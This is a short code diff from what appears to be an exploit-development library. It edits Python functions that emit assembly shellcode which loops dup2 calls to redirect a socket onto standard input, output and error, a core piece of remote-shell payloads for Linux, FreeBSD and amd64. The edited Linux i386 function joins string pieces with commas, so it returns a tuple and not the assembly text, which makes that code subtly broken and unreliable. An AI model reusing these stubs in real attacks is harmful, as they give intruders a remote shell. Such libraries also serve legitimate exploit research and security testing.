@@ -29,22 +29,22 @@ def dup(sock = 'ebp', os = None, arch = None):
 def _dup_linux_i386(sock):
     return """
 dup:
-        setfd ebx, %s
-        push byte 3
+        """, pwn.shellcode.mov('ebx', sock, raw = True), """
+        push 3
         pop ecx
 .loop:
         dec ecx
-        push byte SYS_dup2
+        push SYS_dup2
         pop eax
         int 0x80
         jnz .loop
-""" % str(sock)
+"""
 
 def _dup_freebsd_i386(sock):
     return """
 dup:
-        setfd esi, %s
-        push byte 2
+        """ + pwn.shellcode.mov('esi', sock, raw = True) + """
+        push 2
         pop ebp
         push SYS_dup2
         pop eax
@@ -55,7 +55,7 @@ dup:
         dec ebp
         jns .loop
 .after:
-""" % str(sock)
+"""
 
 def _dup_amd64(sock):
     sock = arg_fixup(sock)
@@ -72,14 +72,14 @@ def _dup_amd64(sock):
     return """
 dup:
         %s
-        push byte 3
+        push 3
 .loop:
         mov edi, ebp
         pop rsi
         dec esi
         js .after
         push rsi
-        push SYS64_dup2
+        push SYS_dup2
         pop rax
         syscall
         jmp .loop
